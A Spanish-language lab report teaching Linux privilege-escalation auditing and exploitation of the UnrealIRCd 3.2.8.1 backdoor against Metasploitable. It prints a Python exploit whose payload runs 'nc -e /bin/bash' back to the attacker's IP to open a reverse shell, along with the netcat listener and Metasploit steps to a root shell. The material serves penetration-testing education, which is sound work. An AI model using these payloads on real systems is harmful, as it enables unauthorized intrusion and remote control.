Documentos de Referencia: "AS-I - Explotación de Vulnerabilidades_ Linux.pdf"

---

### 1. Resumen Ejecutivo
Este informe técnico detalla los procedimientos y herramientas utilizados para la auditoría y explotación de vulnerabilidades en sistemas Linux, centrándose en la elevación de privilegios y la ejecución de comandos remotos. Se analizan herramientas como **Linux-Exploit-Suggester**, **uname**, **searchsploit**, **nmap** y **Metasploit**, y se explican en detalle sus funcionalidades y uso práctico. Además, se aborda un caso de estudio sobre la vulnerabilidad de la puerta trasera en el servidor UnrealIRCd, demostrando cómo se puede explotar manualmente y con Metasploit. El objetivo principal es proporcionar una guía exhaustiva y didáctica sobre la identificación y el aprovechamiento de fallos de seguridad en entornos Linux.

---

### 2. Conceptos Fundamentales
* **Linux-Exploit-Suggester:** Esta herramienta para Linux identifica posibles vulnerabilidades de seguridad en un sistema. Funciona comparando la versión del kernel con una base de datos de exploits conocidos. Está diseñada para la auditoría de elevación de privilegios en un entorno ya comprometido, con el objetivo de escalar a privilegios de root. Utiliza métodos heurísticos para determinar la probabilidad de que un exploit sea exitoso. Proporciona una lista de posibles exploits, incluyendo enlaces a referencias de CVE, pruebas de concepto y una breve descripción de la vulnerabilidad. Al ejecutarse, a menudo utiliza el comando `uname -r` para obtener la versión del kernel y listar los exploits aplicables.

* **Entorno de Laboratorio:** El entorno de trabajo consiste en una máquina atacante, Kali Linux, y una máquina víctima, Metasploitable3 o Metasploitable2. Se recomienda utilizar una versión antigua de Linux para encontrar más vulnerabilidades.

* **Comando `uname`:** Este comando se utiliza para imprimir información del sistema.
    * `uname -s`: Imprime el nombre del kernel (por ejemplo, Linux).
    * `uname -r`: Imprime la versión de la "kernel release". Esta es la versión más recomendada para su uso con herramientas de análisis de exploits.
    * `uname -v`: Imprime la "kernel version". Proporciona una información más amplia que la anterior.
    * `uname -a`: Imprime toda la información del sistema en un solo "string" o cadena de texto.

* **Servicio UnrealIRCd:** Un "daemon" (programa que se ejecuta en segundo plano) de Internet Relay Chat (IRC) de código abierto que ha existido desde 1999. Administra las conexiones, los canales de chat, los mensajes y la seguridad de un servidor. Se hizo famoso por un incidente de seguridad en el que una versión oficial (Unreal3.2.8.1) fue comprometida con una puerta trasera oculta.

* **Puerta Trasera (Backdoor):** Un método malicioso para evadir la seguridad normal y obtener acceso a un sistema. En el caso de UnrealIRCd, el "backdoor" fue un código malicioso insertado en el paquete de instalación oficial. Permitía a un atacante ejecutar cualquier comando con los privilegios del usuario que ejecutaba el IRCd. La vulnerabilidad se activaba enviando un mensaje que comenzaba con los caracteres "AB".

* **Metasploit Framework:** Una plataforma de "penetration testing" que permite a los profesionales de la ciberseguridad desarrollar, probar y ejecutar exploits contra máquinas. Se utiliza la consola **msfconsole** para interactuar con los diferentes módulos disponibles, como los auxiliares y los exploits.

---

### 3. Procedimientos Prácticos
A continuación, se describen los procedimientos de explotación de vulnerabilidades.

#### **Auditoría de Vulnerabilidades con Linux-Exploit-Suggester**
El proceso de auditoría se lleva a cabo en dos escenarios: pasando la versión del kernel y pasando el "uname string" completo.

1.  **Descarga y Permisos de Ejecución:**
    * Utiliza `wget` para descargar el script desde la URL del repositorio de Github y renómbralo a `les.sh`. El comando sería `wget https://.../Linux-exploit-suggester.sh -O les.sh`. Tal como se muestra en la captura de pantalla del comando `wget`.
    * Verifica que el archivo no tiene permisos de ejecución con `ls -al les.sh`.
    * Otorga permisos de ejecución al script usando el comando `sudo chmod +x les.sh`. La captura de pantalla confirma la asignación de permisos.

2.  **Uso con la Versión del Kernel:**
    * Obtén la versión del kernel de la máquina víctima (Metasploitable) con el comando `uname -r`. Por ejemplo, `3.13.0-24-generic`.
    * Ejecuta el script con el parámetro `-k` seguido de la versión del kernel. El comando es `./les.sh -k 3.13.0-24-generic`.
    * El resultado muestra una lista de vulnerabilidades posibles, clasificadas por su nivel de exposición (por ejemplo, `less probable`, `probable`, `highly probable`). La captura de pantalla ilustra la salida del comando, que incluye CVEs como `dirtycow`.

3.  **Uso con el `uname string`:**
    * Obtén el "string" completo del sistema con el comando `uname -a`.
    * Ejecuta el script con el parámetro `-u` seguido del "string" entre comillas. Por ejemplo, `./les.sh -u "Linux kali 6.6.9-amd64 #1 SMP..."`.
    * El resultado proporciona un análisis más exhaustivo, ya que recibe más información del sistema, aumentando la probabilidad de identificar vulnerabilidades "altamente probables".

#### **Explotación de UnrealIRCd con un Script de Python**
Este procedimiento demuestra la creación de un exploit personalizado para la vulnerabilidad de UnrealIRCd.

1.  **Reconocimiento de Puertos:**
    * Utiliza `arp-scan` para identificar la dirección IP de la máquina víctima en la red. El comando `sudo arp-scan 10.0.1.0/24` escanea el segmento de red y devuelve la IP de los "hosts" activos. La captura de pantalla muestra que la IP de Metasploitable2 es `10.0.1.11`.
    * Realiza un escaneo de puertos con `nmap` para identificar servicios abiertos. El comando `sudo nmap -open -sV 10.0.1.11` escanea la IP objetivo y muestra los puertos abiertos y las versiones de los servicios. La captura de pantalla del resultado muestra que el puerto `6667/tcp` está abierto y corriendo el servicio `UnrealIRCD`.

2.  **Creación del Exploit en Python:**
    * Crea un archivo de script llamado `exploit.py` con `nano`.
    * Importa la librería `socket` para la comunicación de red.
    * Establece una conexión TCP al puerto 6667 de la IP víctima: `s = socket.create_connection(("10.0.1.11", 6667))`.
    * Envía el "payload" (`"AB: nc -e /bin/bash 10.0.1.8 4444 \n"`) utilizando la función `sendall`. La cadena "AB" activa la vulnerabilidad, y el comando `nc -e...` establece una `reverse shell` a la máquina del atacante (IP `10.0.1.8`, puerto `4444`). La captura de pantalla muestra la línea de código `s.sendall((f"AB; nc -e /bin/bash 10.0.1.8 4444 \n").encode())`.
    * Recibe la respuesta del servidor con `data = s.recv(1024)` y cierra la conexión con `s.close()`.
    * Añade una verificación simple para imprimir "Pwnd!" si se reciben datos, indicando una explotación exitosa.

3.  **Ejecución del Ataque:**
    * En una terminal separada, inicia un "listener" con `netcat` para recibir la `reverse shell`: `nc -lvnp 4444`. La captura de pantalla muestra que el "listener" se pone en espera.
    * Ejecuta el script de Python con `python3 exploit.py`.
    * Si el ataque es exitoso, el script imprimirá "Pwnd!", y el "listener" en la otra terminal mostrará una conexión entrante, dándote una `shell` con privilegios de root, tal como se muestra en la captura de pantalla del comando `whoami`.

#### **Explotación de UnrealIRCd con Metasploit**
Metasploit simplifica el proceso de explotación utilizando módulos preexistentes.

1.  **Inicio de Metasploit y Escaneo de Puertos:**
    * Inicia la consola de Metasploit con `sudo msfconsole`.
    * Utiliza el módulo auxiliar de escaneo de puertos: `use auxiliary/scanner/portscan/tcp`.
    * Configura el host objetivo con `set RHOSTS 10.0.1.11` y el número de hilos con `set THREADS 4` para una ejecución más rápida.
    * Ejecuta el escaneo con el comando `run`. La captura de pantalla muestra los resultados del escaneo, incluyendo la detección del puerto `6667/tcp` abierto.

2.  **Selección y Configuración del Exploit:**
    * Busca el exploit para UnrealIRCd con `search unrealircd`.
    * El resultado mostrará el exploit `exploit/unix/irc/unreal_ircd_3281_backdoor`, clasificado con un rango de "excellent".
    * Selecciona el exploit con `use exploit/unix/irc/unreal_ircd_3281_backdoor`.
    * Configura el host objetivo con `set RHOSTS 10.0.1.11`.
    * Metasploit ya tiene un `payload` por defecto, pero se puede listar con `show payloads` y seleccionar uno, como `payload/cmd/unix/bind_perl`.

3.  **Ejecución y Acceso a la Shell:**
    * Lanza el ataque con el comando `run`.
    * Metasploit ejecutará el exploit y abrirá una sesión de "command shell".
    * Utiliza `whoami` para verificar que has obtenido privilegios de root.

---

### 4. Conclusiones y Puntos Clave
#### **Importancia y Beneficios de Seguridad**
* **Verificación de Integridad:** El caso de UnrealIRCd subraya la importancia de verificar la integridad de los archivos descargados, ya sea a través de sumas de comprobación MD5 o firmas PGP/GPG.
* **Seguridad de la Cadena de Suministro:** Este incidente es un ejemplo claro de un ataque a la cadena de suministro de software, donde un componente oficial es comprometido para distribuir "malware".
* **Control de Acceso y Privilegios:** La vulnerabilidad demostrada permite la ejecución de comandos con los privilegios del servicio, lo que resalta la necesidad de limitar los privilegios de los servicios y las aplicaciones para mitigar los daños de un ataque.

#### **Puntos de Aprendizaje Clave**
* La combinación de herramientas de auditoría como **Linux-Exploit-Suggester** y **nmap** permite a los analistas de seguridad obtener una visión completa de las vulnerabilidades potenciales de un sistema.
* Entender la naturaleza de una vulnerabilidad permite a los profesionales desarrollar sus propios "exploits" desde cero, como se demostró con el script de Python para UnrealIRCd.
* Metasploit es una herramienta poderosa que simplifica y acelera el proceso de explotación, proporcionando una amplia gama de módulos listos para usar y facilitando la gestión de sesiones de `shell`.
* El uso de un "payload" es crucial para definir la acción que se desea ejecutar después de explotar una vulnerabilidad, como obtener una `reverse shell`.

#### **Relevancia Técnica**
Los procedimientos detallados en este informe son fundamentales en la ciberseguridad profesional. La capacidad de identificar, analizar y explotar vulnerabilidades es una habilidad esencial para los "pen-testers" y los analistas de seguridad. El uso de herramientas como **Linux-Exploit-Suggester** y **Metasploit** permite automatizar y escalar las auditorías de seguridad, mientras que la comprensión manual de las vulnerabilidades, como la de UnrealIRCd, proporciona un conocimiento profundo de cómo funcionan los ataques y cómo proteger los sistemas contra ellos.